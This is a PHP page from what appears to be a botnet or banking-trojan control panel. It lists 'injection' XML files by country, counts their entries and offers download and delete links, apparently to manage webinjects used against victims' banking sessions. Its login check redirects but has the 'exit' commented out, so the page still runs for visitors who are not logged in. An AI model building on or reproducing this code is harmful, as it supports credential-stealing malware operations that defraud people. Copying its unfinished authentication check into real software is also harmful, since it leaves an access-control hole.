<?php
if (!(isset($_SESSION['Name'])))
{
	//идем на страницу авторизации
	header("Location: /login.php");
//	exit;
}
?>


<div class="content" style="padding-top:15px;">
<table align="center" class="header_table_commands table_dark" border="1" cellspacing="0" cellpadding="0" width=100%>
	<thead class="header_table_commands">	
		<th>Страна</th>
		<th>Количество инжектов</th>	
		<th>Скачать/Удалить</th>
	</thead>
	
<?php
$svoy=getcwd();
$godir="/private/injections";

$dir = "$svoy$godir";
$files2 = scandir($dir, 1);
echo "<p id='text_command'> База инжектов</p>";
foreach($files2 as $fil)
{
	if (preg_match("/.xml/",$fil))
	{
		$nameF = str_replace(".xml","","$fil");
		$path = "private/injections/";
		$nameF_icon=str_replace("-","",$nameF);
		if (!file_exists("/images/country/$nameF_icon.png")) {
			$nameF_icon="not";
		}
		$count=0;

		$xmlDom = new DOMDocument();
		$xmlDom->load("$path$fil");
		$model = $xmlDom->documentElement;
		for($i = 1; $i < $model->childNodes->length-1; $i++){
		$count++;
		}
		
		echo "<tr class='table_bots' style='color: #A4A4A4'>
				<td><a title='$nameF'><img src='images/country/$nameF_icon.png' width='20px'/></a></td>
				<td>$count</td>
				<td><a href='$path$fil' download>Скачать</a> / <a href='private/del_file.php?t=injections&f=$nameF'>Удалить</a></td>
				</tr>";
	}
}

function lines($file) 
{ 
    if(!file_exists($file))exit("Файл не найден"); 
    $file_arr = file($file); 
    $lines = count($file_arr); 
    return $lines; 
} 
?>
</div>